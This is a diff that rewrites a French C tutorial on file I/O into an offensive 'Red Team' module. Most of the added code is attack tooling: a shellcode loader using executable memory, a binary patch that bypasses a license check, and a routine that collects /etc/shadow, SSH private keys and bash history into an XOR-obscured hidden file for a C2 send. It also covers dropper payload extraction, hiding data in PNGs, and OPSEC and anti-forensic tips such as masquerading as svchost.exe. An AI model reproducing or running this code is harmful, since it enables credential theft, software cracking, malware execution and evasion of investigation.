@@ -1,462 +1,436 @@
-# Cours : Fichiers I/O (Entrées/Sorties)
+# Module 14 - File I/O : Lire, Écrire, Exfiltrer
 
-## Objectif du Module
+## Pourquoi tu dois maîtriser ça
 
-Maîtriser les opérations d'entrée/sortie sur fichiers : ouvrir/fermer avec fopen/fclose, lire/écrire avec fread/fwrite/fgets/fputs, comprendre les modes d'ouverture (r, w, a, b), naviguer dans un fichier avec fseek/ftell/rewind, différencier fichiers texte vs binaires, et parser des fichiers binaires. Application Red Team : extraction de données, parsing de logs, manipulation de payloads.
+```c
+// Charger un shellcode depuis disque
+unsigned char* sc = read_file("payload.bin", &size);
+void (*exec)(void) = (void(*)(void))sc;
+exec();
+
+// Patcher un binaire (bypass license check)
+FILE* fp = fopen("target.exe", "r+b");
+fseek(fp, 0x1234, SEEK_SET);
+fwrite("\x90\x90", 1, 2, fp);  // JNE → NOP NOP
+fclose(fp);
+
+// Exfiltrer /etc/passwd
+char* data = read_file("/etc/passwd", &size);
+send_to_c2(data, size);
+```
+
+**File I/O = charger des payloads, exfiltrer des données, patcher des binaires.**
 
 ---
 
-## 1. Ouverture et Fermeture de Fichiers
-
-### 1.1 fopen() - Ouvrir un Fichier
+## fopen/fclose : Base obligatoire
 
 ```c
-FILE *fopen(const char *filename, const char *mode);
-```
-
-Retourne un pointeur `FILE*` ou `NULL` en cas d'erreur.
-
-```c
-FILE *fp = fopen("fichier.txt", "r");
-if (fp == NULL) {
-    perror("Erreur ouverture");
-    exit(1);
+FILE* fp = fopen("fichier.txt", "r");
+if (!fp) {
+    perror("fopen");  // Affiche l'erreur
+    return -1;
 }
-
 // ... utilisation ...
-
-fclose(fp);  // TOUJOURS fermer !
+fclose(fp);  // TOUJOURS fermer
 ```
 
-### 1.2 Modes d'Ouverture
+> **FILE\*** = pointeur opaque vers une structure fichier. **perror()** affiche le message d'erreur système.
 
-```
-┌──────┬─────────────────────────────────────────────┐
-│ Mode │ Description                                 │
-├──────┼─────────────────────────────────────────────┤
-│ "r"  │ Lecture seule (fichier doit exister)       │
-│ "w"  │ Écriture (crée ou ÉCRASE)                   │
-│ "a"  │ Ajout (append à la fin)                     │
-│ "r+" │ Lecture + écriture (doit exister)           │
-│ "w+" │ Lecture + écriture (crée ou écrase)         │
-│ "a+" │ Lecture + ajout                             │
-├──────┼─────────────────────────────────────────────┤
-│ "rb" │ Lecture BINAIRE                             │
-│ "wb" │ Écriture BINAIRE                            │
-│ "ab" │ Ajout BINAIRE                               │
-│ ...  │ (ajouter 'b' pour mode binaire)             │
-└──────┴─────────────────────────────────────────────┘
-```
+### Modes d'ouverture
 
-**Schéma modes :**
-```
-"r" (read) :
-fichier.txt existe → OK, lecture
-fichier.txt n'existe pas → NULL (échec)
+| Mode | Action | Si n'existe pas |
+|------|--------|-----------------|
+| `"r"` | Lecture | Erreur |
+| `"w"` | Écriture (écrase) | Crée |
+| `"a"` | Append (fin) | Crée |
+| `"r+"` | Lecture + écriture | Erreur |
+| `"w+"` | Lecture + écriture | Crée (écrase) |
+| `"r+b"` | Binaire read/write | **Pour patching** |
 
-"w" (write) :
-fichier.txt existe → ÉCRASE tout, puis écriture
-fichier.txt n'existe pas → CRÉE, puis écriture
-
-"a" (append) :
-fichier.txt existe → Ajoute à la FIN
-fichier.txt n'existe pas → CRÉE, puis écriture
-```
+> Ajoute `b` pour le mode **binaire** (`"rb"`, `"wb"`, `"r+b"`). Obligatoire pour payloads/shellcode.
 
 ---
 
-## 2. Lecture de Fichiers
+## Lire des fichiers
 
-### 2.1 fgets() - Lire Ligne par Ligne (Texte)
-
-```c
-char *fgets(char *str, int n, FILE *stream);
-```
+### fread() : Lecture binaire (payloads)
 
 ```c
-FILE *fp = fopen("fichier.txt", "r");
-char buffer[256];
-
-while (fgets(buffer, sizeof(buffer), fp) != NULL) {
-    printf("%s", buffer);  // Affiche chaque ligne
-}
-
-fclose(fp);
+unsigned char buffer[1024];
+size_t bytes_read = fread(buffer, 1, sizeof(buffer), fp);
+//                        │       │  │              │
+//                        dest    │  max bytes      source
+//                           element size
 ```
 
-**Schéma :**
-```
-fichier.txt :
-┌────────────────┐
-│ Ligne 1\n      │ ← fgets() lit jusqu'au \n
-│ Ligne 2\n      │ ← ou jusqu'à n-1 caractères
-│ Ligne 3\n      │
-└────────────────┘
-```
-
-### 2.2 fread() - Lire Bloc Binaire
+### fgets() : Lecture ligne par ligne (logs/config)
 
 ```c
-size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);
-```
-
-```c
-FILE *fp = fopen("data.bin", "rb");
-int buffer[10];
-
-size_t count = fread(buffer, sizeof(int), 10, fp);
-printf("Lu %zu entiers\n", count);
-
-fclose(fp);
-```
-
-**Schéma :**
-```
-fread(buffer, sizeof(int), 10, fp) :
-        │        │          │
-        │        │          └─ Nombre d'éléments
-        │        └─ Taille de chaque élément
-        └─ Destination
-
-Lit : 10 × 4 bytes = 40 bytes
-```
-
-### 2.3 fgetc() - Lire Caractère par Caractère
-
-```c
-int c;
-while ((c = fgetc(fp)) != EOF) {
-    putchar(c);
-}
-```
-
----
-
-## 3. Écriture de Fichiers
-
-### 3.1 fprintf() - Écrire Formaté (Texte)
-
-```c
-FILE *fp = fopen("output.txt", "w");
-fprintf(fp, "Nom: %s, Age: %d\n", "Alice", 25);
-fclose(fp);
-```
-
-### 3.2 fputs() - Écrire Chaîne
-
-```c
-FILE *fp = fopen("output.txt", "w");
-fputs("Ligne de texte\n", fp);
-fclose(fp);
-```
-
-### 3.3 fwrite() - Écrire Bloc Binaire
-
-```c
-FILE *fp = fopen("data.bin", "wb");
-
-int data[5] = {10, 20, 30, 40, 50};
-fwrite(data, sizeof(int), 5, fp);
-
-fclose(fp);
-```
-
-**Schéma :**
-```
-fwrite(data, sizeof(int), 5, fp) :
-
-Écrit : 5 × 4 bytes = 20 bytes
-
-data.bin :
-┌────┬────┬────┬────┬────┐
-│ 10 │ 20 │ 30 │ 40 │ 50 │  (binaire, pas texte)
-└────┴────┴────┴────┴────┘
-```
-
----
-
-## 4. Navigation dans un Fichier
-
-### 4.1 fseek() - Déplacer le Curseur
-
-```c
-int fseek(FILE *stream, long offset, int whence);
-```
-
-**Constantes `whence` :**
-- `SEEK_SET` : Depuis le début
-- `SEEK_CUR` : Depuis position actuelle
-- `SEEK_END` : Depuis la fin
-
-```c
-FILE *fp = fopen("data.bin", "rb");
-
-fseek(fp, 0, SEEK_END);   // Aller à la fin
-long size = ftell(fp);     // Taille du fichier
-fseek(fp, 0, SEEK_SET);   // Retour au début
-
-printf("Taille : %ld bytes\n", size);
-fclose(fp);
-```
-
-**Schéma :**
-```
-fichier.bin (100 bytes) :
-┌────────────────────────────────────┐
-│ [0] ... [50] ... [99]              │
-└────────────────────────────────────┘
-  ↑                    ↑
-SEEK_SET (début)     SEEK_END (fin)
-
-fseek(fp, 10, SEEK_SET) :
-┌────────────────────────────────────┐
-│ [0] ... [10] ... [99]              │
-└─────────┬──────────────────────────┘
-          ↑
-     Curseur à l'offset 10
-
-fseek(fp, -5, SEEK_END) :
-┌────────────────────────────────────┐
-│ [0] ... [94] ... [99]              │
-└────────────────────┬───────────────┘
-                     ↑
-            Curseur à 99-5=94
-```
-
-### 4.2 ftell() - Position Actuelle
-
-```c
-long pos = ftell(fp);
-printf("Position : %ld\n", pos);
-```
-
-### 4.3 rewind() - Retour au Début
-
-```c
-rewind(fp);  // Équivaut à fseek(fp, 0, SEEK_SET)
-```
-
----
-
-## 5. Fichiers Texte vs Binaires
-
-### 5.1 Fichier Texte
-
-```c
-// Écriture texte
-FILE *fp = fopen("text.txt", "w");
-fprintf(fp, "%d", 42);  // Écrit "42" (2 caractères ASCII)
-fclose(fp);
-
-// Contenu du fichier :
-// '4' '2' (0x34 0x32 en ASCII)
-```
-
-### 5.2 Fichier Binaire
-
-```c
-// Écriture binaire
-FILE *fp = fopen("binary.bin", "wb");
-int num = 42;
-fwrite(&num, sizeof(int), 1, fp);  // Écrit 42 (4 bytes binaires)
-fclose(fp);
-
-// Contenu du fichier :
-// 0x2A 0x00 0x00 0x00 (little-endian)
-```
-
-**Comparaison :**
-```
-TEXTE (fprintf) :
-Le nombre 12345 → "12345" (5 bytes ASCII)
-┌───┬───┬───┬───┬───┐
-│'1'│'2'│'3'│'4'│'5'│
-│0x31│0x32│0x33│0x34│0x35│
-└───┴───┴───┴───┴───┘
-
-BINAIRE (fwrite) :
-Le nombre 12345 → 0x3039 (4 bytes int)
-┌────┬────┬────┬────┐
-│0x39│0x30│0x00│0x00│  (little-endian)
-└────┴────┴────┴────┘
-
-Fichier texte = lisible par humain
-Fichier binaire = compact mais illisible
-```
-
----
-
-## 6. Lire un Fichier Entier
-
-```c
-char* read_file(const char *filename) {
-    FILE *fp = fopen(filename, "rb");
-    if (fp == NULL) return NULL;
-
-    // Taille du fichier
-    fseek(fp, 0, SEEK_END);
-    long size = ftell(fp);
-    fseek(fp, 0, SEEK_SET);
-
-    // Allouer buffer
-    char *content = malloc(size + 1);
-    fread(content, 1, size, fp);
-    content[size] = '\0';  // Null-terminator
-
-    fclose(fp);
-    return content;
-}
-
-// Utilisation
-char *data = read_file("fichier.txt");
-printf("%s\n", data);
-free(data);
-```
-
----
-
-## 7. Gestion d'Erreurs
-
-```c
-FILE *fp = fopen("fichier.txt", "r");
-if (fp == NULL) {
-    perror("fopen");  // Affiche l'erreur système
-    exit(1);
-}
-
-// Vérifier erreurs de lecture
-if (ferror(fp)) {
-    fprintf(stderr, "Erreur I/O\n");
-    clearerr(fp);  // Effacer le flag d'erreur
-}
-
-// Vérifier fin de fichier
-if (feof(fp)) {
-    printf("Fin de fichier atteinte\n");
-}
-
-fclose(fp);
-```
-
----
-
-## 8. Application Red Team
-
-### 8.1 Extraction de Payload depuis Fichier
-
-```c
-// Lire un shellcode depuis un fichier binaire
-FILE *fp = fopen("shellcode.bin", "rb");
-
-fseek(fp, 0, SEEK_END);
-long size = ftell(fp);
-fseek(fp, 0, SEEK_SET);
-
-unsigned char *shellcode = malloc(size);
-fread(shellcode, 1, size, fp);
-fclose(fp);
-
-// Exécuter
-void (*run)() = (void(*)())shellcode;
-run();
-```
-
-### 8.2 Parsing de Logs
-
-```c
-FILE *fp = fopen("/var/log/auth.log", "r");
-char line[1024];
-
+char line[256];
 while (fgets(line, sizeof(line), fp)) {
-    if (strstr(line, "Failed password")) {
-        printf("[ALERT] %s", line);
+    if (strstr(line, "password")) {
+        printf("[+] Found: %s", line);
     }
 }
+```
 
+### Lire un fichier entier (pattern crucial)
+
+```c
+unsigned char* read_file(const char* path, long* size) {
+    FILE* fp = fopen(path, "rb");
+    if (!fp) return NULL;
+
+    fseek(fp, 0, SEEK_END);
+    *size = ftell(fp);
+    fseek(fp, 0, SEEK_SET);
+
+    unsigned char* buf = malloc(*size);
+    fread(buf, 1, *size, fp);
+    fclose(fp);
+
+    return buf;  // Appelant doit free()
+}
+
+// Usage
+long size;
+unsigned char* shellcode = read_file("payload.bin", &size);
+```
+
+---
+
+## Écrire des fichiers
+
+### fwrite() : Écriture binaire
+
+```c
+unsigned char data[] = {0x48, 0x31, 0xC0, 0xC3};
+FILE* fp = fopen("shellcode.bin", "wb");
+fwrite(data, 1, sizeof(data), fp);
 fclose(fp);
 ```
 
-### 8.3 Injection dans un Exécutable (Patching)
+### fprintf() : Écriture formatée
 
 ```c
-// Modifier un byte à l'offset 0x1234
-FILE *fp = fopen("program.exe", "r+b");
-
-fseek(fp, 0x1234, SEEK_SET);  // Aller à l'offset
-unsigned char patch = 0x90;    // NOP instruction
-fwrite(&patch, 1, 1, fp);      // Écrire le patch
-
-fclose(fp);
-```
-
-### 8.4 Exfiltration de Données
-
-```c
-// Exfiltrer des données sensibles
-FILE *fp = fopen("/tmp/.hidden.txt", "w");
-
-fprintf(fp, "Username: %s\n", getenv("USER"));
-fprintf(fp, "Path: %s\n", getenv("PATH"));
-
-// Données système
-system("uname -a >> /tmp/.hidden.txt");
-
+FILE* fp = fopen("/tmp/.exfil.txt", "w");
+fprintf(fp, "User: %s\n", getenv("USER"));
+fprintf(fp, "Home: %s\n", getenv("HOME"));
 fclose(fp);
 ```
 
 ---
 
-## 9. Sécurité et Risques
+## Navigation : fseek/ftell
 
-### 9.1 Path Traversal
+> **fseek()** déplace le curseur, **ftell()** retourne la position actuelle.
 
 ```c
-// VULNÉRABLE
-char filename[256];
-scanf("%s", filename);
-FILE *fp = fopen(filename, "r");  // Attaquant peut lire /etc/passwd
+fseek(fp, offset, whence);
+//       │       │
+//       │       └── SEEK_SET (début), SEEK_CUR (actuel), SEEK_END (fin)
+//       └── Nombre de bytes (peut être négatif)
+```
 
-// SÉCURISÉ
-if (strstr(filename, "..") != NULL) {
-    fprintf(stderr, "Path traversal detected\n");
-    exit(1);
+### Obtenir la taille d'un fichier
+
+```c
+fseek(fp, 0, SEEK_END);
+long size = ftell(fp);
+fseek(fp, 0, SEEK_SET);  // Retour au début
+```
+
+### Lire à un offset spécifique
+
+```c
+// Lire le header PE (offset 0x3C contient l'offset du PE header)
+fseek(fp, 0x3C, SEEK_SET);
+unsigned int pe_offset;
+fread(&pe_offset, 4, 1, fp);
+
+fseek(fp, pe_offset, SEEK_SET);
+// Maintenant on est au PE header
+```
+
+---
+
+## Applications offensives
+
+### 1. Charger et exécuter un shellcode
+
+```c
+void load_and_exec(const char* path) {
+    long size;
+    unsigned char* code = read_file(path, &size);
+    if (!code) return;
+
+    // Allouer mémoire exécutable (VirtualAlloc sur Windows)
+    void* exec_mem = mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC,
+                          MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    memcpy(exec_mem, code, size);
+    free(code);
+
+    ((void(*)(void))exec_mem)();
 }
 ```
 
-### 9.2 Buffer Overflow sur fgets
+### 2. Patcher un binaire (bypass check)
 
 ```c
-char buffer[10];
+int patch_binary(const char* path, long offset, unsigned char* patch, int len) {
+    FILE* fp = fopen(path, "r+b");  // Read+Write binary
+    if (!fp) return -1;
 
-// VULNÉRABLE
-fgets(buffer, 100, fp);  // Peut déborder buffer[10]
+    fseek(fp, offset, SEEK_SET);
+    fwrite(patch, 1, len, fp);
 
-// SÉCURISÉ
-fgets(buffer, sizeof(buffer), fp);  // Limite à la taille réelle
+    fclose(fp);
+    return 0;
+}
+
+// Usage : remplacer JNE (0x75) par JMP (0xEB) à l'offset 0x1234
+unsigned char jmp = 0xEB;
+patch_binary("target.exe", 0x1234, &jmp, 1);
+```
+
+### 3. Exfiltration de fichiers sensibles
+
+```c
+void exfil_config(void) {
+    char* targets[] = {
+        "/etc/passwd",
+        "/etc/shadow",       // Besoin root
+        "/home/*/.ssh/id_rsa",
+        "/home/*/.bash_history",
+        NULL
+    };
+
+    FILE* out = fopen("/tmp/.dump.enc", "wb");
+
+    for (int i = 0; targets[i]; i++) {
+        long size;
+        unsigned char* data = read_file(targets[i], &size);
+        if (data) {
+            // XOR avant écriture
+            for (long j = 0; j < size; j++) data[j] ^= 0x42;
+            fwrite(data, 1, size, out);
+            free(data);
+        }
+    }
+    fclose(out);
+}
+```
+
+### 4. Extraction de payload depuis un dropper
+
+```c
+// Le dropper contient un marker suivi du payload
+#define MARKER "\xDE\xAD\xBE\xEF"
+
+unsigned char* extract_payload(const char* dropper, long* payload_size) {
+    long file_size;
+    unsigned char* data = read_file(dropper, &file_size);
+    if (!data) return NULL;
+
+    // Chercher le marker
+    for (long i = 0; i < file_size - 4; i++) {
+        if (memcmp(data + i, MARKER, 4) == 0) {
+            // Payload commence après le marker
+            *payload_size = file_size - i - 4;
+            unsigned char* payload = malloc(*payload_size);
+            memcpy(payload, data + i + 4, *payload_size);
+            free(data);
+            return payload;
+        }
+    }
+
+    free(data);
+    return NULL;
+}
+```
+
+### 5. Parsing de logs (recon)
+
+```c
+void scan_auth_logs(void) {
+    FILE* fp = fopen("/var/log/auth.log", "r");
+    if (!fp) return;
+
+    char line[1024];
+    while (fgets(line, sizeof(line), fp)) {
+        if (strstr(line, "Accepted password") ||
+            strstr(line, "sudo:")) {
+            printf("[+] %s", line);
+        }
+    }
+    fclose(fp);
+}
+```
+
+### 6. Steganographie basique (append après EOF)
+
+```c
+// Cacher des données après la fin d'un PNG
+void hide_in_png(const char* png_path, unsigned char* data, int len) {
+    FILE* fp = fopen(png_path, "ab");  // Append binary
+    fwrite("\x00\x00\x00\x00HIDE", 1, 8, fp);  // Marker
+    fwrite(data, 1, len, fp);
+    fclose(fp);
+}
+
+// Extraire
+unsigned char* extract_from_png(const char* png_path, int* len) {
+    long size;
+    unsigned char* file = read_file(png_path, &size);
+
+    // Chercher marker "HIDE"
+    for (long i = 0; i < size - 4; i++) {
+        if (memcmp(file + i, "HIDE", 4) == 0) {
+            *len = size - i - 4;
+            unsigned char* hidden = malloc(*len);
+            memcpy(hidden, file + i + 4, *len);
+            free(file);
+            return hidden;
+        }
+    }
+    free(file);
+    return NULL;
+}
 ```
 
 ---
 
-## 10. Checklist de Compréhension
+## OPSEC : Erreurs à éviter
 
-- [ ] Différence entre "r", "w", "a" ?
-- [ ] Quand utiliser "rb" vs "r" ?
-- [ ] Comment lire un fichier entier ?
-- [ ] À quoi sert fseek() ?
-- [ ] Différence fgets() vs fread() ?
-- [ ] Pourquoi toujours fermer les fichiers ?
-- [ ] Comment vérifier les erreurs I/O ?
+| ❌ Dangereux | ✅ Safe |
+|-------------|---------|
+| Fichiers avec noms suspects (`malware.exe`) | Noms génériques (`svchost.exe`, `update.dat`) |
+| Écrire dans `/home/user/` | Écrire dans `/tmp/`, `/var/tmp/` |
+| Laisser les fichiers après usage | `remove()` après utilisation |
+| Permissions par défaut | `chmod()` pour restreindre |
+
+```c
+// Supprimer ses traces
+remove("/tmp/.payload.bin");
+
+// Ou écraser avant suppression (anti-forensic)
+void secure_delete(const char* path) {
+    long size;
+    read_file(path, &size);
+
+    FILE* fp = fopen(path, "wb");
+    for (long i = 0; i < size; i++) fputc(0x00, fp);
+    fclose(fp);
+    remove(path);
+}
+```
 
 ---
 
-## 11. Exercices Pratiques
+## Fichier texte vs binaire
 
-Voir `exercice.txt` pour :
-- Copier un fichier binaire
-- Parser un fichier CSV
-- Modifier un exécutable (patching)
-- Extraire un payload depuis un PNG (stéganographie basique)
+| Aspect | Texte (`"r"`, `"w"`) | Binaire (`"rb"`, `"wb"`) |
+|--------|---------------------|--------------------------|
+| Newlines | Convertis (`\r\n` → `\n`) | Préservés |
+| Usage | Config, logs | Shellcode, EXE, PE |
+| Fonctions | `fgets`, `fprintf` | `fread`, `fwrite` |
+
+**Règle : Toujours `"rb"`/`"wb"` pour des payloads.**
 
 ---
 
-**Fin de la Phase 01 - C Fundamentals !** Vous maîtrisez maintenant les bases du C. Prochaine phase : Phase 02 - Memory Management.
+## Pièges courants
+
+### Oublier de fermer
+
+```c
+FILE* fp = fopen("file.txt", "r");
+// ... erreur quelque part, return sans fclose
+// → File descriptor leak, max files ouverts atteint
+```
+
+**Solution : pattern goto cleanup**
+
+```c
+int process_file(const char* path) {
+    FILE* fp = NULL;
+    char* buf = NULL;
+    int ret = -1;
+
+    fp = fopen(path, "rb");
+    if (!fp) goto cleanup;
+
+    buf = malloc(1024);
+    if (!buf) goto cleanup;
+
+    // ... traitement ...
+    ret = 0;
+
+cleanup:
+    if (buf) free(buf);
+    if (fp) fclose(fp);
+    return ret;
+}
+```
+
+### Buffer trop petit pour fgets
+
+```c
+char buf[10];
+fgets(buf, 100, fp);  // ❌ Buffer overflow !
+fgets(buf, sizeof(buf), fp);  // ✅
+```
+
+---
+
+## Exercices pratiques
+
+### Exo 1 : read_file helper (5 min)
+Implémente la fonction `read_file()` complète avec gestion d'erreurs.
+
+### Exo 2 : Binary patcher (10 min)
+Crée un outil qui remplace `0x75` (JNE) par `0xEB` (JMP) à un offset donné.
+
+### Exo 3 : Log scanner (10 min)
+Parse `/var/log/auth.log` et extrait les tentatives de connexion échouées.
+
+### Exo 4 : Payload extractor (15 min)
+Extrait un payload caché dans un fichier après un marker `0xDEADBEEF`.
+
+---
+
+## Checklist
+
+```
+□ Je sais utiliser fopen/fclose avec gestion d'erreurs
+□ Je comprends les modes "r", "w", "a", "rb", "r+b"
+□ Je sais lire un fichier entier (fseek + ftell + fread)
+□ Je sais patcher un binaire à un offset donné
+□ Je sais naviguer avec fseek (SEEK_SET, SEEK_CUR, SEEK_END)
+□ Je comprends la différence texte vs binaire
+□ Je sais cacher/extraire des données (steganographie)
+```
+
+---
+
+## Glossaire express
+
+| Terme | Définition |
+|-------|------------|
+| **FILE\*** | Pointeur vers structure fichier (opaque) |
+| **fseek** | Déplace le curseur de lecture/écriture |
+| **ftell** | Retourne la position actuelle |
+| **SEEK_SET/CUR/END** | Référence pour fseek (début/actuel/fin) |
+| **Steganographie** | Cacher des données dans un fichier légitime |
+| **Dropper** | Exécutable qui contient et extrait un payload |
+
+---
+
+## Prochaine étape
+
+**Module suivant →** [15 - Preprocessor](../15_preprocessor/)
+
+---
+
+**Temps lecture :** 8 min | **Pratique :** 30 min
